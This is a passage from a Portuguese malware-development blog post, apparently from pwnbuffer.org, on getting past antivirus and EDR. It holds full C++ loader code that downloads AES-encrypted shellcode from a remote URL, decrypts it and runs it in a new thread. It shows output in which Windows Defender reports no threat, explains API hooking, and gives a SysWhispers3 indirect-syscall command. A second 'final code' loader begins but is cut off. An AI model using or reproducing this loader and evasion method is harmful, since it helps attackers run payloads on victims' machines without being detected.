</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Type: 0x%X (MEM_PRIVATE=0x20000, MEM_IMAGE=0x1000000)</span><span style="color:#ed9d13">\n\n</span><span style="color:#ed9d13">&#34;</span>, mbi.Type);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">const</span> LPCTSTR url = <span style="color:#ed9d13">L</span><span style="color:#ed9d13">&#34;http://192.168.0.10/x&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> key[] = { 
</span></span><span style="display:flex;"><span>     <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x21</span>, <span style="color:#3677a9">0x35</span>, <span style="color:#3677a9">0x0a</span>, <span style="color:#3677a9">0x23</span>, <span style="color:#3677a9">0xbf</span>, <span style="color:#3677a9">0xa8</span>, <span style="color:#3677a9">0xbc</span>, <span style="color:#3677a9">0x99</span>, <span style="color:#3677a9">0xf1</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x3a</span>, <span style="color:#3677a9">0x3c</span>, <span style="color:#3677a9">0xc4</span>, <span style="color:#3677a9">0x92</span>, <span style="color:#3677a9">0x8e</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#447fcf">GetPayloadFromUrl</span>(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
</span></span><span style="display:flex;"><span>    BOOL bSTATE = TRUE;
</span></span><span style="display:flex;"><span>    HINTERNET hSession = <span style="color:#24909d">NULL</span>, hConnect = <span style="color:#24909d">NULL</span>, hRequest = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    DWORD dwBytesRead = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    SIZE_T sSize = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    PBYTE pBytes = <span style="color:#24909d">NULL</span>, pTmpBytes = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    URL_COMPONENTS urlComp;
</span></span><span style="display:flex;"><span>    WCHAR szHostName[<span style="color:#3677a9">256</span>] = { <span style="color:#3677a9">0</span> };
</span></span><span style="display:flex;"><span>    WCHAR szUrlPath[<span style="color:#3677a9">256</span>] = { <span style="color:#3677a9">0</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ZeroMemory(&amp;urlComp, <span style="color:#6ab825;font-weight:bold">sizeof</span>(urlComp));
</span></span><span style="display:flex;"><span>    urlComp.dwStructSize = <span style="color:#6ab825;font-weight:bold">sizeof</span>(urlComp);
</span></span><span style="display:flex;"><span>    urlComp.lpszHostName = szHostName;
</span></span><span style="display:flex;"><span>    urlComp.dwHostNameLength = <span style="color:#6ab825;font-weight:bold">sizeof</span>(szHostName) / <span style="color:#6ab825;font-weight:bold">sizeof</span>(szHostName[<span style="color:#3677a9">0</span>]);
</span></span><span style="display:flex;"><span>    urlComp.lpszUrlPath = szUrlPath;
</span></span><span style="display:flex;"><span>    urlComp.dwUrlPathLength = <span style="color:#6ab825;font-weight:bold">sizeof</span>(szUrlPath) / <span style="color:#6ab825;font-weight:bold">sizeof</span>(szUrlPath[<span style="color:#3677a9">0</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpCrackUrl(szUrl, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, &amp;urlComp)) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hSession = WinHttpOpen(<span style="color:#ed9d13">L</span><span style="color:#ed9d13">&#34;&#34;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hSession == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hConnect == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hRequest = WinHttpOpenRequest(hConnect, <span style="color:#ed9d13">L</span><span style="color:#ed9d13">&#34;GET&#34;</span>, urlComp.lpszUrlPath, <span style="color:#24909d">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hRequest == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span style="color:#3677a9">0</span>, WINHTTP_NO_REQUEST_DATA, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>)) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpReceiveResponse(hRequest, <span style="color:#24909d">NULL</span>)) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pTmpBytes = (PBYTE)LocalAlloc(LPTR, <span style="color:#3677a9">1024</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (pTmpBytes == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">while</span> (TRUE) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpReadData(hRequest, pTmpBytes, <span style="color:#3677a9">1024</span>, &amp;dwBytesRead)) {
</span></span><span style="display:flex;"><span>            bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (dwBytesRead == <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        sSize += dwBytesRead;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (pBytes == <span style="color:#24909d">NULL</span>)
</span></span><span style="display:flex;"><span>            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span>            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (pBytes == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>            bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
</span></span><span style="display:flex;"><span>        memset(pTmpBytes, <span style="color:#ed9d13">&#39;\0&#39;</span>, dwBytesRead);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    *pPayloadBytes = pBytes;
</span></span><span style="display:flex;"><span>    *sPayloadSize = sSize;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_EndOfFunction:
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hSession) WinHttpCloseHandle(hSession);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hConnect) WinHttpCloseHandle(hConnect);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hRequest) WinHttpCloseHandle(hRequest);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (pTmpBytes) LocalFree(pTmpBytes);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> bSTATE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">AESDecrypt</span>(<span style="color:#6ab825;font-weight:bold">char</span>* payload, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span> payload_len, <span style="color:#6ab825;font-weight:bold">char</span>* key, SIZE_T keylen) {
</span></span><span style="display:flex;"><span>    HCRYPTPROV hProv;
</span></span><span style="display:flex;"><span>    HCRYPTHASH hHash;
</span></span><span style="display:flex;"><span>    HCRYPTKEY hKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptAcquireContextW(&amp;hProv, <span style="color:#24909d">NULL</span>, <span style="color:#24909d">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptCreateHash(hProv, CALG_SHA_256, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, &amp;hHash)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, <span style="color:#3677a9">0</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptDeriveKey(hProv, CALG_AES_256, hHash, <span style="color:#3677a9">0</span>, &amp;hKey)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptDecrypt(hKey, (HCRYPTHASH)<span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, payload, &amp;payload_len)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    CryptReleaseContext(hProv, <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    CryptDestroyHash(hHash);
</span></span><span style="display:flex;"><span>    CryptDestroyKey(hKey);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>() {
</span></span><span style="display:flex;"><span>    PBYTE EncShellcode = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    SIZE_T fileSize = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    PVOID exec_mem = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    HANDLE hThread = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    NTSTATUS status;
</span></span><span style="display:flex;"><span>    DWORD oldProtect = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 1. Baixar o shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!GetPayloadFromUrl(url, &amp;EncShellcode, &amp;fileSize)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Encriptado&#34;</span>, EncShellcode, fileSize);
</span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Shellcode criptografado carregado da URL.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
</span></span><span style="display:flex;"><span>    printMemoryInfo(EncShellcode, <span style="color:#ed9d13">&#34;EncShellcode&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 2. Descriptografar o shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    AESDecrypt((<span style="color:#6ab825;font-weight:bold">char</span>*)EncShellcode, fileSize, key, <span style="color:#6ab825;font-weight:bold">sizeof</span>(key));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    exec_mem = VirtualAlloc(<span style="color:#3677a9">0</span>, <span style="color:#6ab825;font-weight:bold">sizeof</span>(EncShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (exec_mem == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#ed9d13">&#34;Falha ao alocar mem√≥ria.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    memcpy(exec_mem, EncShellcode, fileSize);
</span></span><span style="display:flex;"><span>    VirtualProtect(exec_mem, fileSize, PAGE_EXECUTE_READ, &amp;oldProtect);
</span></span><span style="display:flex;"><span>    hThread = CreateThread(<span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#ed9d13">&#34;Falha ao criar thread.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    WaitForSingleObject(hThread, INFINITE);
</span></span><span style="display:flex;"><span>    CloseHandle(hThread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>




<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
<label for="tab-1-0" class="tab-label">C:</label>
<div class="tab-content tab-content-1-0">
  <pre tabindex="0"><code>C:\Users\mount\Desktop\maldev\avidentifier&gt;avfind.exe -defender -path good-loader.exe
2025/03/29 16:09:30 Scanning the file with Windows Defender: good-loader.exe
2025/03/29 16:09:30 Failed to scan the file with Windows Defender: NoThreatFound
</code></pre>
</div>




</div>



<p>Eeee, bingo! Conseguimos burlar o <code>AV/Defender</code>, por√©m ainda ser√° detect√°vel em um EDR. Isso acontece pelo uso das fun√ß√µes <em><code>VirtualAlloc</code></em>, <em><code>VirtualProtect</code></em> e <em><code>CreateThread</code></em>, que s√£o muito usadas em malware e, por isso, s√£o interceptadas por ele, usando uma t√©cnica chamada <code>‚ÄúAPI HOOKING‚Äù</code>.</p>
<p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/imports.png"></p>
<h2 id="api-hooking">
  API HOOKING
  <a class="heading-link" href="#api-hooking">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabe√ßalho"></i>
    <span class="sr-only">Link para o cabe√ßalho</span>
  </a>
</h2>
<p>Um fluxo normal de chamada de API no Windows funciona da seguinte forma:</p>
<p><code>CreateRemoteThread()</code> ‚Üí <code>NtCreateThreadEx()</code> ‚Üí <code>SYSCALL</code></p>
<p>A fun√ß√£o <code>CreateRemoteThread</code> chama a <code>NtCreateThreadEx</code> hospedada na <code>ntdll.dll</code>, que por fim chama a <code>syscall</code>. Muitos EDRs monitoram chamadas de <em>NTAPIs</em> usando hooks de trampolim para verificar quando uma fun√ß√£o √© chamada por um programa e quais argumentos ele passa.</p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-2-0:checked ~ .tab-content-2-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-0" checked/>
<label for="tab-2-0" class="tab-label">ASCII</label>
<div class="tab-content tab-content-2-0">
  <pre tabindex="0"><code>CreateRemoteThread() ---&gt; NtCreateThreadEx() ----&gt; SYSCALL 
                                   |      
                                   |       
                                   |      
                                EDR.DLL 
</code></pre>
</div>




</div>



<p>Podemos ignorar isso chamando a syscall indiretamente.</p>
<p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/hook.jpg"></p>
<h2 id="ignorando-a-solu√ß√£o-av">
  Ignorando a solu√ß√£o AV
  <a class="heading-link" href="#ignorando-a-solu%c3%a7%c3%a3o-av">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabe√ßalho"></i>
    <span class="sr-only">Link para o cabe√ßalho</span>
  </a>
</h2>
<p>Vamos instalar o OpenEDR da xcitium para a POC final.
<a href="https://www.openedr.com/"  class="external-link" target="_blank" rel="noopener">https://www.openedr.com/</a></p>
<p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/edr.png"></p>
<p>Para burlar o hook de API do EDR, vamos chamar a syscall indiretamente usando <a href="https://github.com/klezVirus/SysWhispers3"  class="external-link" target="_blank" rel="noopener"><code>github.com/klezVirus/SysWhispers3</code></a> e executar o payload usando APC.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python syswhispers.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtCreateThreadEx,NtQueueApcThread,NtResumeThread,NtWaitForSingleObject -o syscalls_mem
</span></span></code></pre></div><p>C√≥digo final:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">  
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">    
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;Windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;psapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;winhttp.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;wincrypt.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&#34;SysWhispers.h&#34;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#pragma comment(lib, &#34;winhttp.lib&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#pragma comment (lib, &#34;crypt32.lib&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#pragma comment (lib, &#34;advapi32&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define okay(msg, ...) printf(&#34;[+] &#34; msg , ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define info(msg, ...) printf(&#34;[*] &#34; msg , ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define warn(msg, ...) printf(&#34;[-] &#34; msg , ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">printMemoryInfo</span>(<span style="color:#6ab825;font-weight:bold">void</span>* address, <span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span>* name) {
</span></span><span style="display:flex;"><span>    MEMORY_BASIC_INFORMATION mbi;
</span></span><span style="display:flex;"><span>    VirtualQuery(address, &amp;mbi, <span style="color:#6ab825;font-weight:bold">sizeof</span>(mbi));
</span></span><span style="display:flex;"><span>    printf(<span style="color:#ed9d13">&#34;[+] %s: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, name, address);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Base Address: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.BaseAddress);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Allocation Base: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.AllocationBase);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Allocation Protect: 0x%X</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.AllocationProtect);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Region Size: %zu bytes</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.RegionSize);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    State: 0x%X (MEM_COMMIT=0x1000, MEM_RESERVE=0x2000)</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.State);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Protect: 0x%X (PAGE_EXECUTE=0x10, PAGE_READWRITE=0x04)</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.Protect);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Type: 0x%X (MEM_PRIVATE=0x20000, MEM_IMAGE=0x1000000)</span><span style="color:#ed9d13">\n\n</span><span style="color:#ed9d13">&#34;</span>, mbi.Type);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">const</span> LPCTSTR url = <span style="color:#ed9d13">L</span><span style="color:#ed9d13">&#34;http://192.168.0.10/x&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> key[] = { 
</span></span><span style="display:flex;"><span>     <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x21</span>, <span style="color:#3677a9">0x35</span>, <span style="color:#3677a9">0x0a</span>, <span style="color:#3677a9">0x23</span>, <span style="color:#3677a9">0xbf</span>, <span style="color:#3677a9">0xa8</span>, <span style="color:#3677a9">0xbc</span>, <span style="color:#3677a9">0x99</span>, <span style="color:#3677a9">0xf1</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x3a</span>, <span style="color:#3677a9">0x3c</span>, <span style="color:#3677a9">0xc4</span>, <span style="color:#3677a9">0x92</span>, <span style="color:#3677a9">0x8e</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#447fcf">GetPayloadFromUrl</span>(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
</span></span><span style="display:flex;"><span>    BOOL bSTATE = TRUE;
</span></span><span style="display:flex;"><span>    HINTERNET hSession = <span style="color:#24909d">NULL</span>, hConnect = <span style="color:#24909d">NULL</span>, hRequest = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    DWORD dwBytesRead = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    SIZE_T sSize = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    PBYTE pBytes = <span style="color:#24909d">NULL</span>, pTmpBytes = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    URL_COMPONENTS urlComp;
</span></span><span style="display:flex;"><span>    WCHAR szHostName[<span style="color:#3677a9">256</span>] = { <span style="color:#3677a9">0</span> };
</span></span><span style="display:flex;"><span>    WCHAR szUrlPath[<span style="color:#3677a9">256</span>] = { <span style="color:#3677a9">0</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ZeroMemory(&amp;urlComp, <span style="color:#6ab825;font-weight:bold">sizeof</span>(urlComp));
</span></span><span style="display:flex;"><span>    urlComp.dwStructSize = <span style="color:#6ab825;font-weight:bold">sizeof</span>(urlComp);
</span></span><span style="display:flex;"><span>    urlComp.lpszHostName = szHostName;
</span></span><span style="display:flex;"><span>    urlComp.dwHostNameLength = <span style="color:#6ab825;font-weight:bold">sizeof</span>(szHostName) / <span style="color:#6ab825;font-weight:bold">sizeof</span>(szHostName[<span style="color:#3677a9">0</span>]);
</span></span><span style="display:flex;"><span>    urlComp.lpszUrlPath = szUrlPath;
</span></span><span style="display:flex;"><span>    urlComp.dwUrlPathLength = <span style="color:#6ab825;font-weight:bold">sizeof</span>(szUrlPath) / <span style="color:#6ab825;font-weight:bold">sizeof</span>(szUrlPath[<span style="color:#3677a9">0</span>]);
</span></span><span style="display:flex;"><span>
